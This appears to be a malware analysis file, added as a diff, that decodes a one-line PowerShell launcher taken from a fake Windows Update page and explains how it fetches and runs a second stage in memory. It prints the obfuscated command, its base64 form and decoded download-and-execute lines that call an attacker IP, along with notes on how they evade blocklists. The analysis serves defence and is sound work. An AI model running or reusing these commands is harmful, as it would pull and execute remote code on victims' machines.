@@ -1,0 +1,39 @@
+PAYLOAD UNDER ANALYSIS — Stage 1 launcher
+=========================================
+
+Source: user-supplied (pasted from the fake Windows Update page)
+Original file preserved at: powershell.txt
+
+--- RAW (as delivered, one line) ---
+iex([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHA6Ly8xNjYuMS44OS45MS96YXAvJyAtVXNlQmFzaWNQYXJzaW5nIHwgSW52b2tlLUV4cHJlc3Npb24=')))
+
+--- BASE64 BLOB ---
+SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHA6Ly8xNjYuMS44OS45MS96YXAvJyAtVXNlQmFzaWNQYXJzaW5nIHwgSW52b2tlLUV4cHJlc3Npb24=
+
+--- DECODED (ASCII) ---
+Invoke-WebRequest 'http://166.1.89.91/zap/' -UseBasicParsing | Invoke-Expression
+
+--- DECODED (tokenised / what PowerShell actually runs) ---
+Invoke-WebRequest               -> download a URL, return the response body
+  'http://166.1.89.91/zap/'     -> attacker-controlled stage-2 endpoint (plain HTTP, no TLS)
+  -UseBasicParsing              -> skip IE engine, works headless / on Server Core
+| Invoke-Expression             -> take the downloaded text and EXECUTE it as PowerShell
+
+--- EQUIVALENT, UNOBFUSCATED FORM ---
+IWR http://166.1.89.91/zap/ -UseBasicParsing | IEX
+
+
+ANALYST NOTES
+-------------
+* Nothing is written to disk. IWR returns a string in memory; IEX executes it.
+  This is the definition of a fileless / in-memory stager.
+* The stage-2 URL is plain HTTP on a bare IP. No domain, no TLS, no SNI to log.
+  That deliberately defeats domain-based blocklists and certificate pinning.
+* The trailing slash on /zap/ suggests a directory index on the attacker host,
+  i.e. the server decides which payload to serve per request (see cloaking note).
+* Execution happens inside the trusted, signed powershell.exe process. No new
+  binary, no driver, no autorun entry at this stage.
+
+STATIC ONLY — this artefact was decoded with [Convert]::FromBase64String,
+which performs no execution. The payload was never run on any host.
+Stage 2 (/zap/) was never requested; it was NOT downloaded or executed.
